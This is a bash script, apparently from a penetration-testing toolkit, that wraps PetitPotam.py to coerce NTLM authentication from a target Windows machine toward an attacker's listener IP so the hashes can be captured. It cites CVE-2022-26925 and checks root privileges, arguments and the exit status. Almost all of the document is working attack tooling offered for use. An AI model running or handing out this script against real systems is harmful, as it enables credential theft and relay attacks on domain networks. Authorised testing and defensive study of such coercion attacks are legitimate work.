#!/bin/bash

# Function to display usage with explanations for listener IP and target IP
usage() {
    echo -e "\nUsage: petit.sh <domain> <listener IP> <target IP>"
    echo -e "Where:"
    echo -e "  <domain> - The domain against which the attack is performed."
    echo -e "  <listener IP> - The IP address of your attacking machine (where you are listening for NTLM hashes)."
    echo -e "  <target IP> - The IP address of the target Windows machine vulnerable to the PetitPotam attack."
    echo -e "\nExample: ./petit.sh domain.local 10.10.10.10 10.10.10.11\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Validate input parameters
if [ $# -ne 3 ]; then
    usage
    exit 1
fi

# Assign input to variables
DOMAIN="$1"
LISTENER_IP="$2"
TARGET_IP="$3"

# Check for required script
if [ ! -f "./PetitPotam/PetitPotam.py" ]; then
    echo "PetitPotam.py not found in the expected directory."
    exit 1
fi

# Run PetitPotam
echo "Coercing authentication with unauthenticated PetitPotam (CVE-2022-26925)"
echo " "

# PetitPotam.py -d domain listener_ip target_ip
./PetitPotam/PetitPotam.py -d "$DOMAIN" "$LISTENER_IP" "$TARGET_IP"

# Check the exit status
if [ $? -ne 0 ]; then
    echo "PetitPotam execution failed."
    exit 1
else
    echo "PetitPotam executed successfully."
fi
